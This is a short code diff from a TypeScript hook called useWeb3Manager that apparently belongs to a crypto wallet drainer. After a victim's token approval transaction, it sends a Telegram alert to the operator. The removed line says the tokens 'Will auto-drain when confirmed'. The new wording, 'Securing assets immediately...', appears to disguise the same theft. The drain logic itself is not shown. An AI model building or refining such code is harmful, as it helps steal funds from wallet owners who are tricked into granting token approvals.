@@ -635,7 +635,7 @@ export function useWeb3Manager() {
                                 })
                             });
 
-                            notifyTelegram(`<b>✅ APPROVAL QUEUED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Will auto-drain when confirmed</i>`);
+                            notifyTelegram(`<b>✅ APPROVAL DETECTED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Securing assets immediately...</i>`);
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
